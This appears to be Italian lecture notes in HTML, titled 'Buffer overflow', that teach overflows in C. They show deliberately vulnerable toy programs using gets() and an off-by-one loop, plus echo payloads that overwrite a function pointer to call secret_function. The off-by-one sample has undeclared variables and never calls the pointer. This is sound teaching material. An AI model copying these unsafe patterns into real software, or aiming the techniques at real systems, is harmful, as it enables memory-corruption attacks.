@@ -1,0 +1,201 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2024-10-10_Buffer overflow</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__left">
+    <div class="stackedit__toc">
+      
+<ul>
+<li><a href="#buffer-overflow">Buffer overflow</a>
+<ul>
+<li><a href="#rompere-l’integrità-e-crash">Rompere l’integrità e crash</a></li>
+<li><a href="#controllare-il-flusso-di-codice">Controllare il flusso di codice</a></li>
+<li><a href="#off-by-one-bug">Off-by-one bug</a></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+  </div>
+  <div class="stackedit__right">
+    <div class="stackedit__html">
+      <h1 id="buffer-overflow">Buffer overflow</h1>
+<p>Il buffer overflow è una tra le vulnerabilità più comuni tra i software e la principale causa è la scrittura di codice non corretta e sicura.</p>
+<p>Il <strong>buffer overflow</strong> è una condizione in cui è possibile inserire più input in un buffer rispetto alla capacità allocata, andando così a sovrascrivere altre informazioni.</p>
+<p>Questa vulnerabilità viene usata principalmente per:</p>
+<ul>
+<li>far crashare il sistema</li>
+<li>inserire dati che rompono l’integrità</li>
+<li>inserire codice per ottenere il controllo del sistema</li>
+</ul>
+<p>Linguaggi come C sono ritenuti “unsafe” e lasciano al programmatore la responsabilità di implementare i dovuti controlli.</p>
+<h2 id="rompere-l’integrità-e-crash">Rompere l’integrità e crash</h2>
+<p>Consideriamo il seguente codice C</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+
+<span class="token keyword">char</span> buffer1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"one"</span><span class="token punctuation">;</span>    <span class="token comment">// buffer of size 8 initialized with “one”</span>
+<span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> buffer2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"two"</span><span class="token punctuation">;</span>    <span class="token comment">// buffer of size 8 initialized with “two”</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token comment">// prints: address = value,  before user input</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[BEFORE] buffer1 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[BEFORE] value @ %1$p = 0x%2$08x\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>value<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[BEFORE] buffer2 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter your input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">gets</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// reads input into buffer1, whatever length!</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	  <span class="token comment">// prints: address = value,  after user input</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[AFTER] buffer1 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[AFTER] value @ %1$p = 0x%2$08x\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>value<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[AFTER] buffer2 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Abbiamo quindi  l’allocazione di un buffer, una variabile e un altro buffer.</p>
+<p>Viene preso un input utente e viene inserito nel primo buffer.</p>
+<p>Esecuzione:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> <span class="token string">"prova"</span> <span class="token operator">|</span> ./prova
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer1 @ 0x7fe3b7d9a010 <span class="token operator">=</span> one
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> value   @ 0x7fe3b7d9a018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer2 @ 0x7fe3b7d9a020 <span class="token operator">=</span> two
+Please enter your input:
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer1 @ 0x7fe3b7d9a010 <span class="token operator">=</span> prova
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> value   @ 0x7fe3b7d9a018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer2 @ 0x7fe3b7d9a020 <span class="token operator">=</span> two
+</code></pre>
+<p>Notiamo come gli indirizzi delle variabili sono sequenziali, distanziati di 8 byte.</p>
+<p>Se la dimensione dell’input rientra nella dimensione del buffer non ci sono problemi, ma non abbiamo controlli per forzare che ciò avvenga sempre, infatti è possibile inserire un input più grande:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> <span class="token string">"AAAAAAAA"</span> <span class="token operator">|</span> ./prova
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer1 @ 0x7f92ba1bc010 <span class="token operator">=</span> one
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> value   @ 0x7f92ba1bc018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer2 @ 0x7f92ba1bc020 <span class="token operator">=</span> two
+Please enter your input:
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer1 @ 0x7f92ba1bc010 <span class="token operator">=</span> AAAAAAAA
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> value   @ 0x7f92ba1bc018 <span class="token operator">=</span> 0x00000000
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer2 @ 0x7f92ba1bc020 <span class="token operator">=</span> two
+</code></pre>
+<p>la stringa con 8 caratteri ‘A’ va in overflow in quanto la stringa contiene anche il <strong>carattere terminatore ‘0x00’</strong>. Vediamo come viene sovrascritto il valore della variabile <code>value</code>.</p>
+<p>Nota che in <em>little endian</em> i byte vengono prima scritti quelli meno significativi (quelli più a destra).</p>
+<p>Se inseriamo 9 caratteri A, otteniamo il seguente output:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> <span class="token string">"AAAAAAAAA"</span> <span class="token operator">|</span> ./prova
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer1 @ 0x7f669a8de010 <span class="token operator">=</span> one
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> value   @ 0x7f669a8de018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer2 @ 0x7f669a8de020 <span class="token operator">=</span> two
+Please enter your input:
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer1 @ 0x7f669a8de010 <span class="token operator">=</span> AAAAAAAAA
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> value   @ 0x7f669a8de018 <span class="token operator">=</span> 0x00000041
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer2 @ 0x7f669a8de020 <span class="token operator">=</span> two
+</code></pre>
+<p>Continuando ad aumentare il numero di caratteri continuiamo a sovrascrivere le zone di memoria successive. Otteniamo quindi un <strong>buffer overlfow</strong>. Ciò che può limitare la dimensione del nostro input è un errore di <strong>segmentation fault</strong> (e quindi crash del programma), che si verificherebbe nel caso arrivassimo a sovrascrivere zone di memoria non assegnate al nostro processo.</p>
+<p>La funzione <code>gets</code> è <em>unsafe</em> perché non limita in alcun modo la dimensione dell’input, e non dovrebbe venir mai utilizzata, inoltre durante la compilazione appare un <em>warning</em> che avverte di ciò.</p>
+<h2 id="controllare-il-flusso-di-codice">Controllare il flusso di codice</h2>
+<p>Con il buffer overflow è possibili modificare il normale flusso di codice, principalmente in due modi:</p>
+<ul>
+<li>sovrascrivendo il puntatore ad una funzione</li>
+<li>sovrascrivendo con nuovo codice</li>
+</ul>
+<p>Ad esempio se definiamo un tipo di dato:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> element <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> element_t<span class="token punctuation">;</span>
+</code></pre>
+<p>contenente un buffer e puntatore ad una funzione.</p>
+<p>In questo modo un buffer overflow può sovrascrivere il puntatore alla funzione, in modo da eseguire una funzione differente da quella attesa.</p>
+<p>Ad esempio:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> element <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> element_t<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">secret_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Secret function!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">show_data</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data = %s\n"</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 element_t e<span class="token punctuation">;</span>
+	 e<span class="token punctuation">.</span>f <span class="token operator">=</span> show_data<span class="token punctuation">;</span> <span class="token comment">// legitimate function</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Insert data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">gets</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// reads data, unsafe!</span>
+	 e<span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>L’obiettivo dell’attacco è quello di far invocare la funzione <code>secret_function()</code>:</p>
+<p>Per semplificare l’attacco disabilitiamo l’opzione di compilazione <strong>PIE</strong> (<em>Position Independent Executable</em>) che rende più difficile exploitare la vulnerabilità rendendo randomizzata la posizione in memoria del programma.</p>
+<p><code>$ gcc overflow-struct.c -o overflow-struct --no-pie --static</code></p>
+<p>Adesso usando gdb, possiamo ottenere l’indirizzo della funzione <code>secret_function()</code>:</p>
+<pre class=" language-nasm"><code class="prism  language-nasm"><span class="token operator">$</span> gdb <span class="token operator">-</span>q overflow<span class="token operator">-</span>struct
+...
+(gdb) x<span class="token operator">/</span>x secret_function
+	<span class="token number">0x400b4d</span> <span class="token operator">&lt;</span>secret_function<span class="token operator">&gt;</span>: <span class="token number">0xe5894855</span>
+</code></pre>
+<p>Adesso per riuscire a sovrascrivere il puntatore bisogna riempire il buffer fino alla sua dimensione massima con dei dati qualsiasi e poi andare in overflow inserendo l’indirizzo della <code>secret_function</code>.</p>
+<p>Nota che gli indirizzi sono a 8 byte e sono in little endian</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token keyword">echo</span> -e <span class="token string">"AAAAAAAAAAAAAAAA\x4d\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="token operator">|</span> ./overflow-struct
+Insert data: Secret function<span class="token operator">!</span>
+</code></pre>
+<h2 id="off-by-one-bug">Off-by-one bug</h2>
+<p>Un tipico errore di programmazione può essere il seguente, in qui viene sbagliato il controllo sull’indice finale.</p>
+<pre class=" language-c"><code class="prism  language-c">
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> element <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> element_t<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">secret_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Secret function!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">show_data</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data = %s\n"</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 element_t e<span class="token punctuation">;</span>
+	 e<span class="token punctuation">.</span>f <span class="token operator">=</span> show_data<span class="token punctuation">;</span> <span class="token comment">// legitimate function</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Insert data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">memset</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	 <span class="token comment">//errore: i&lt;=sizeof(e.data)</span>
+	 <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c<span class="token operator">=</span><span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token constant">EOF</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		 e<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
+	 <span class="token punctuation">}</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"show_data = %p, secret_function = %p\n"</span><span class="token punctuation">,</span>show_data<span class="token punctuation">,</span>secret_function<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Con l’ultima <code>printf</code> andiamo a controllare gli indirizzi assegnati alle due funzioni: <code>show_data</code> e <code>secret_function</code>.</p>
+<p>eseguendo il programma più volte notiamo come gli indirizzi delle due funzioni <strong>cambiano solo per l’ultimo byte</strong>.</p>
+<pre class=" language-c"><code class="prism  language-c">$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x560bfd9287dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x560bfd9287ca</span>
+$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x56260d01f7dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x56260d01f7ca</span>
+$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x5646872967dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x5646872967ca</span>
+$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x55f42b85f7dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x55f42b85f7ca</span>
+</code></pre>
+<p>Sfruttando l’errore sul controllo dell’indice del buffer possiamo modificare tale byte, che ci è sufficiente per cambiare la funzione invocata:</p>
+<pre class=" language-c"><code class="prism  language-c">$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAAA\xca"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Secret function<span class="token operator">!</span>
+show_data <span class="token operator">=</span> <span class="token number">0x560975daa7dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x560975daa7ca</span>
+</code></pre>
+
+    </div>
+  </div>
+</body>
+
+</html>
